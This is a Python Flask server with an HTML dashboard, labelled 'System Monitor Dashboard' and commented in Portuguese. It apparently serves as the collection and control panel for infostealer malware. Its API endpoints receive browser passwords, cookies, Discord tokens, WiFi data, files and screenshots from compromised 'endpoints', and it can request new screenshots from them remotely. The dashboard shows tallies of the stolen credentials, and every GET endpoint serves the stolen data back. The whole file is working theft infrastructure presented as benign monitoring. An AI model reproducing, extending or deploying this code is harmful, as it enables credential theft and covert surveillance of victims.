#!/usr/bin/env python3
"""
System Monitor Dashboard - Versão COMPLETA com Relatórios
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        print(f"✅ Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST', 'OPTIONS'])
def receive_metrics():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', [])
        
        for metric in metrics:
            metric['endpoint_id'] = endpoint_id
            metric['received_at'] = datetime.now().isoformat()
            metrics_data.append(metric)
        
        print(f"📊 Métricas recebidas de {endpoint_id}: {len(metrics)} itens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens', methods=['POST', 'OPTIONS'])
def receive_tokens():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        endpoint_tokens[endpoint_id] = {
            'tokens': tokens,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔑 Tokens recebidos de {endpoint_id}: {len(tokens)} tokens")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST', 'OPTIONS'])
def receive_cookies():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        endpoint_cookies[endpoint_id] = {
            'cookies': cookies,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🍪 Cookies recebidos de {endpoint_id}: {len(cookies)} cookies")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST', 'OPTIONS'])
def receive_passwords():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        endpoint_passwords[endpoint_id] = {
            'passwords': passwords,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"🔒 Senhas recebidas de {endpoint_id}: {len(passwords)} senhas")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST', 'OPTIONS'])
def receive_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id not in endpoint_files:
            endpoint_files[endpoint_id] = []
        
        endpoint_files[endpoint_id].extend(files)
        
        print(f"📁 Arquivos recebidos de {endpoint_id}: {len(files)} arquivos")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# NOVOS ENDPOINTS PARA RELATÓRIOS COMPLETOS
@app.route('/api/full_report', methods=['POST', 'OPTIONS'])
def receive_full_report():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        # Salva o relatório completo
        full_reports[endpoint_id] = {
            'metadata': data,
            'received_at': datetime.now().isoformat()
        }
        
        print(f"📋 Relatório completo recebido de {endpoint_id}")
        print(f"   Senhas: {data.get('total_passwords', 0)}")
        print(f"   Cookies: {data.get('total_cookies', 0)}")
        print(f"   Tokens: {data.get('total_tokens', 0)}")
        print(f"   WiFi: {data.get('wifi_networks', 0)}")
        print(f"   Screenshot: {'Sim' if data.get('screenshot_included') else 'Não'}")
        
        return jsonify({'status': 'success', 'message': 'Full report received'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_upload', methods=['POST', 'OPTIONS'])
def upload_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if 'screenshot' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
        
        file = request.files['screenshot']
        endpoint_id = request.form.get('endpoint_id', 'unknown')
        
        if file:
            # Converte para base64
            image_data = file.read()
            image_base64 = base64.b64encode(image_data).decode('utf-8')
            
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'filename': file.filename,
                'timestamp': datetime.now().isoformat()
            }
            
            print(f"📸 Screenshot upload recebido de {endpoint_id}: {file.filename}")
        
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/complete_report_upload', methods=['POST', 'OPTIONS'])
def upload_complete_report():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if 'report' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file uploaded'}), 400
        
        file = request.files['report']
        endpoint_id = request.form.get('endpoint_id', 'unknown')
        
        if file:
            # Salva informações do arquivo
            uploaded_files[endpoint_id] = {
                'filename': file.filename,
                'size': len(file.read()),
                'content_type': file.content_type,
                'timestamp': datetime.now().isoformat()
            }
            
            # Volta ao início do arquivo para salvar
            file.seek(0)
            
            # Salva o arquivo no disco
            save_path = f"uploads/{endpoint_id}_{file.filename}"
            os.makedirs('uploads', exist_ok=True)
            file.save(save_path)
            
            print(f"📦 Relatório completo upload recebido de {endpoint_id}")
            print(f"   Arquivo: {file.filename}")
            print(f"   Tamanho: {uploaded_files[endpoint_id]['size']} bytes")
            print(f"   Salvo em: {save_path}")
        
        return jsonify({'status': 'success', 'message': 'Complete report uploaded'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
def receive_screenshot():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            print(f"📸 Screenshot recebido de {endpoint_id}!")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
def request_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        screenshot_requests[endpoint_id] = {
            'requested': True,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"📸 Screenshot solicitado para: {endpoint_id}")
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
def check_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        request_data = screenshot_requests.get(endpoint_id, {})
        return jsonify({
            'request_screenshot': request_data.get('requested', False),
            'timestamp': request_data.get('timestamp')
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
def clear_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if endpoint_id in screenshot_requests:
            del screenshot_requests[endpoint_id]
            print(f"🧹 Solicitação limpa para: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ENDPOINTS DE LEITURA
@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
def get_endpoints():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoints)

@app.route('/api/metrics_data', methods=['GET', 'OPTIONS'])
def get_metrics_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(metrics_data)

@app.route('/api/screenshots', methods=['GET', 'OPTIONS'])
def get_screenshots():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_screenshots)

@app.route('/api/full_reports', methods=['GET', 'OPTIONS'])
def get_full_reports():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(full_reports)

@app.route('/api/uploaded_files', methods=['GET', 'OPTIONS'])
def get_uploaded_files():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(uploaded_files)

@app.route('/api/tokens_data', methods=['GET', 'OPTIONS'])
def get_tokens_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data', methods=['GET', 'OPTIONS'])
def get_cookies_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data', methods=['GET', 'OPTIONS'])
def get_passwords_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_passwords)

@app.route('/api/files_data', methods=['GET', 'OPTIONS'])
def get_files_data():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    return jsonify(endpoint_files)

# Template HTML atualizado
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #36393f;
            color: #dcddde;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; color: #7289da; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }
        .stat-card { 
            background: #4f545c; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center;
        }
        .stat-number { font-size: 2em; font-weight: bold; color: #43b581; }
        .section { 
            background: #4f545c; 
            margin-bottom: 30px; 
            border-radius: 8px; 
            padding: 25px;
        }
        .section h2 { margin-bottom: 20px; color: #43b581; }
        .grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 20px; 
        }
        .card { 
            background: #36393f; 
            padding: 20px; 
            border-radius: 8px; 
            border: 1px solid #202225;
        }
        .card h3 { margin-bottom: 15px; color: #7289da; }
        .card p { margin: 5px 0; }
        .screenshot { max-width: 100%; border-radius: 8px; margin-top: 10px; }
        .btn { 
            background: #7289da; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer;
            margin: 5px;
        }
        .btn:hover { background: #5f6bb3; }
        .refresh-btn { 
            position: fixed; 
            bottom: 20px; 
            right: 20px; 
            background: #43b581;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 18px;
        }
        .tabs { display: flex; margin-bottom: 20px; }
        .tab { 
            background: #36393f; 
            color: #dcddde; 
            border: none; 
            padding: 10px 20px; 
            cursor: pointer;
            border-radius: 5px 5px 0 0;
            margin-right: 5px;
        }
        .tab.active { background: #7289da; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>System Monitor</h1>
            <p>Painel de Monitoramento em Tempo Real</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalEndpoints">0</div>
                <div>Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalReports">0</div>
                <div>Relatórios</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalPasswords">0</div>
                <div>Senhas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalTokens">0</div>
                <div>Tokens</div>
            </div>
        </div>

        <div class="tabs">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('reports')">Relatórios</button>
            <button class="tab" onclick="showTab('data')">Dados</button>
            <button class="tab" onclick="showTab('screenshots')">Screenshots</button>
        </div>

        <div id="endpoints" class="tab-content active">
            <div class="section">
                <h2>Endpoints Conectados</h2>
                <div id="endpointsList" class="grid"></div>
            </div>
        </div>

        <div id="reports" class="tab-content">
            <div class="section">
                <h2>Relatórios Completos</h2>
                <div id="fullReportsList" class="grid"></div>
            </div>
        </div>

        <div id="data" class="tab-content">
            <div class="section">
                <h2>Tokens Discord</h2>
                <div id="tokensList" class="grid"></div>
            </div>
            <div class="section">
                <h2>Senhas Navegadores</h2>
                <div id="passwordsList" class="grid"></div>
            </div>
            <div class="section">
                <h2>Cookies</h2>
                <div id="cookiesList" class="grid"></div>
            </div>
        </div>

        <div id="screenshots" class="tab-content">
            <div class="section">
                <h2>Screenshots</h2>
                <div id="screenshotsList" class="grid"></div>
            </div>
        </div>
    </div>

    <button class="refresh-btn" onclick="loadAllData()">🔄</button>

    <script>
        function showTab(tabName) {
            // Esconde todos os conteúdos
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Mostra o conteúdo selecionado
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        async function loadEndpoints() {
            try {
                const response = await fetch('/api/endpoints');
                const endpoints = await response.json();
                
                const container = document.getElementById('endpointsList');
                container.innerHTML = '';
                
                Object.values(endpoints).forEach(endpoint => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint.hostname}</h3>
                        <p><strong>ID:</strong> \${endpoint.id}</p>
                        <p><strong>User:</strong> \${endpoint.user}</p>
                        <p><strong>IP:</strong> \${endpoint.ip_address}</p>
                        <p><strong>External:</strong> \${endpoint.external_ip}</p>
                        <p><strong>Platform:</strong> \${endpoint.platform}</p>
                        <p><strong>RAM:</strong> \${endpoint.ram}</p>
                        <p><strong>Status:</strong> 🟢 Online</p>
                        <button class="btn" onclick="requestScreenshot('\${endpoint.id}')">📸 Screenshot</button>
                    \`;
                    container.appendChild(div);
                });
                
                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
            } catch (error) {
                console.error('Error loading endpoints:', error);
            }
        }

        async function loadFullReports() {
            try {
                const response = await fetch('/api/full_reports');
                const reports = await response.json();
                
                const container = document.getElementById('fullReportsList');
                container.innerHTML = '';
                
                let totalPasswords = 0;
                let totalTokens = 0;
                
                Object.entries(reports).forEach(([endpoint_id, report]) => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${report.metadata.hostname}</h3>
                        <p><strong>User:</strong> \${report.metadata.user}</p>
                        <p><strong>Passwords:</strong> \${report.metadata.total_passwords}</p>
                        <p><strong>Cookies:</strong> \${report.metadata.total_cookies}</p>
                        <p><strong>Tokens:</strong> \${report.metadata.total_tokens}</p>
                        <p><strong>WiFi:</strong> \${report.metadata.wifi_networks}</p>
                        <p><strong>Screenshot:</strong> \${report.metadata.screenshot_included ? '✅' : '❌'}</p>
                        <p><strong>Received:</strong> \${new Date(report.received_at).toLocaleString()}</p>
                    \`;
                    container.appendChild(div);
                    
                    totalPasswords += report.metadata.total_passwords || 0;
                    totalTokens += report.metadata.total_tokens || 0;
                });
                
                document.getElementById('totalReports').textContent = Object.keys(reports).length;
                document.getElementById('totalPasswords').textContent = totalPasswords;
                document.getElementById('totalTokens').textContent = totalTokens;
            } catch (error) {
                console.error('Error loading reports:', error);
            }
        }

        async function loadData() {
            try {
                // Carrega tokens
                const tokensResponse = await fetch('/api/tokens_data');
                const tokens = await tokensResponse.json();
                
                const tokensContainer = document.getElementById('tokensList');
                tokensContainer.innerHTML = '';
                
                Object.entries(tokens).forEach(([endpoint_id, data]) => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint_id}</h3>
                        <p><strong>Tokens:</strong> \${data.tokens.length}</p>
                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
                    \`;
                    tokensContainer.appendChild(div);
                });

                // Carrega senhas
                const passwordsResponse = await fetch('/api/passwords_data');
                const passwords = await passwordsResponse.json();
                
                const passwordsContainer = document.getElementById('passwordsList');
                passwordsContainer.innerHTML = '';
                
                Object.entries(passwords).forEach(([endpoint_id, data]) => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint_id}</h3>
                        <p><strong>Passwords:</strong> \${data.passwords.length}</p>
                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
                    \`;
                    passwordsContainer.appendChild(div);
                });

                // Carrega cookies
                const cookiesResponse = await fetch('/api/cookies_data');
                const cookies = await cookiesResponse.json();
                
                const cookiesContainer = document.getElementById('cookiesList');
                cookiesContainer.innerHTML = '';
                
                Object.entries(cookies).forEach(([endpoint_id, data]) => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint_id}</h3>
                        <p><strong>Cookies:</strong> \${data.cookies.length}</p>
                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
                    \`;
                    cookiesContainer.appendChild(div);
                });
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }

        async function loadScreenshots() {
            try {
                const response = await fetch('/api/screenshots');
                const screenshots = await response.json();
                
                const container = document.getElementById('screenshotsList');
                container.innerHTML = '';
                
                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
                    const div = document.createElement('div');
                    div.className = 'card';
                    div.innerHTML = \`
                        <h3>\${endpoint_id}</h3>
                        <p><strong>Date:</strong> \${new Date(screenshot.timestamp).toLocaleString()}</p>
                        \${screenshot.image ? \`<img src="data:image/png;base64,\${screenshot.image}" class="screenshot" alt="Screenshot">\` : ''}
                    \`;
                    container.appendChild(div);
                });
            } catch (error) {
                console.error('Error loading screenshots:', error);
            }
        }

        async function requestScreenshot(endpointId) {
            try {
                const response = await fetch(\`/api/request_screenshot/\${endpointId}\`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(\`Screenshot solicitado para \${endpointId}!\`);
                } else {
                    alert(\`Erro: \${result.message}\`);
                }
            } catch (error) {
                alert('Erro ao solicitar screenshot');
            }
        }

        function loadAllData() {
            loadEndpoints();
            loadFullReports();
            loadData();
            loadScreenshots();
        }

        loadAllData();
        setInterval(loadAllData, 30000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("🚀 Iniciando System Monitor COMPLETO...")
    print("📡 Endpoints disponíveis:")
    print("   - POST /api/register")
    print("   - POST /api/metrics")
    print("   - POST /api/tokens")
    print("   - POST /api/cookies")
    print("   - POST /api/passwords")
    print("   - POST /api/files")
    print("   - POST /api/full_report")
    print("   - POST /api/screenshot_upload")
    print("   - POST /api/complete_report_upload")
    print("   - GET  /api/endpoints")
    print("   - GET  /api/full_reports")
    print("   - GET  /api/tokens_data")
    print("   - GET  /api/cookies_data")
    print("   - GET  /api/passwords_data")
    print("   - GET  /api/screenshots")
    print()
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
